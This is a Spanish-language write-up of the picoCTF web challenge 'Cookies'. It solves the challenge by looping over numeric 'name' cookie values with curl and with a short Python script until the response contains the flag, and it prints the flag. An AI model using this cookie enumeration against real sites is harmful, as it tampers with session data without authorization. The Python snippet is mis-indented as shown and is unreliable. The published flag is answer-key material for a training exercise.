## Descripción 
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)
## Solución 1

Usando linux

Primero nos conectamos a la página y vemos que tenemos que poner nombres de galletas para que nos de la bandera, ponemos algunos nombres y nos dice si son correctas o in correctas pero es difícil encontrar la correcta.

Abrimos linux y utilizamos un comando usando for para encontrar la bandera.
Usando el comando for i con curl -H y "Cookie" name=$! para que nos de los nombres de las galletas, pero usando el comando | grep picoCTF sacamos la bandera entre todas las opciones

```
Utilizando el comando for i in {1..20}; do curl -H "Cookie: name=$i" http://mercury.picoctf.net:27177/check; done | grep picoCTF

flag: picoCTF{3v3ry1_l0v3s_c00k135_064663be}

```

## Solución 2

Usando python

Usamos el comando nano exp.py para crear un archivo de python y hacer un ciclo para sacar la posible bandera entre tantas opciones, hacemos el ciclo y corremos con python exp.py y nos arroja la bandera directamente 

```
vSalazarZ-picoctf@webshell:~$ nano exp.py

import requests 
import re 

url= "http://mercury.picoctf.net:27177/check"
for i in range(20): cookies = {'name':'{}'.format(i)}
	#printf(cookies)
	r = requests.get(url, cookies=cookies)
	if 'picoCTF' in r.text: 
		#print(r.text) 
		flag = re.findall('picoCTF{.*?}',r.text)[0] 
		print(flag)

vSalazarZ-picoctf@webshell:~$ python exp.py
picoCTF{3v3ry1_l0v3s_c00k135_064663be}
vSalazarZ-picoctf@webshell:~$ 

flag: picoCTF{3v3ry1_l0v3s_c00k135_064663be}
```
